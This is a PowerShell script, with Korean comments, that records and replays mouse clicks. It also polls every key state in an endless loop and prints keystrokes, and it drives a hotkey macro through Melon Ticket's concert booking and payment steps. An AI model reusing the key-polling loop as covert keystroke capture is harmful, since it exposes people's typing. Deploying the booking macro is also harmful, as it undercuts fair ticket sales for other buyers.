# Get Mouse Points
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
Add-Type -AssemblyName System.Windows.Forms
[string]$xstr = "`$p1 = @("
[string]$ystr = "`$p2 = @("
while ($true) {
    Start-Sleep -Milliseconds 100
    if ($API::GetAsyncKeyState(80)) { # P Key status
        $X = [System.Windows.Forms.Cursor]::Position.X
        $Y = [System.Windows.Forms.Cursor]::Position.Y
        Write-Host "Captured X: $X | Y: $Y"
        $xstr += "`"$X`","; $ystr += "`"$Y`","
    }
    if ($API::GetAsyncKeyState(81)) { # P qKey status
        Write-Host " "
        $xstr -Replace ',$',')'; $ystr -Replace ',$',')'
        break
    }
}


# Mouse Click
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;

foreach($i in 0..($p1.Count - 1)) {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1[$i], $p2[$i])
    [W.U32]::mouse_event(6,0,0,0,0);
    Start-Sleep -Milliseconds 250
}


# Get Key value
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
 
    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)
        
        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock
           write-host $ascii
        }
      }
    }
 














#$link="https://ticket.melon.com/performance/index.htm?prodId=207126"  # 아이유 콘서트 링크
#$link="https://ticket.melon.com/performance/index.htm?prodId=207171"  # 테스트 링크

$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
Add-Type -AssemblyName System.Windows.Forms

# ,: (날짜선택, 예매하기), . : 새로고침, / : 다음버튼 #
$Shorts1 = @("312","1050","923","914")       # 단축 기능 좌표
$Shorts2 = @("732","910","674","327")
$p1 = @("151","204","188","344","550","584") # 마지막 결제 단계 자동화 좌표
$p2 = @("449","511","557","581","582","678")
#$p1 = @("151","204","188","344","550","584","869")
#$p2 = @("449","511","557","581","582","678","674")
while ($true) {
    Start-Sleep -Milliseconds 40
    if ($API::GetAsyncKeyState(186)) { # Number ; Key status
        foreach($i in 0..4) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1[$i], $p2[$i])
            [W.U32]::mouse_event(6,0,0,0,0);
            Start-Sleep -Milliseconds 40
        }
        [System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
        [System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
        foreach($i in 5) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1[$i], $p2[$i])
            [W.U32]::mouse_event(6,0,0,0,0);
        }
    }
    elseif ($API::GetAsyncKeyState(188)) { # Number , Key status, ,: (날짜선택, 예매하기)
        foreach($i in 0..1) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($Shorts1[$i], $Shorts2[$i])
            [W.U32]::mouse_event(6,0,0,0,0);
            Start-Sleep -Milliseconds 40
        }
    }
    elseif ($API::GetAsyncKeyState(190)) { # Number . Key status, .: 새로 고침
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($Shorts1[3], $Shorts2[3])
        [W.U32]::mouse_event(6,0,0,0,0);
        Start-Sleep -Milliseconds 40
    }
    elseif ($API::GetAsyncKeyState(191)) { # Number / Key status, /: 다음 버튼
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($Shorts1[2], $Shorts2[2])
        [W.U32]::mouse_event(6,0,0,0,0);
        Start-Sleep -Milliseconds 40
    }
}
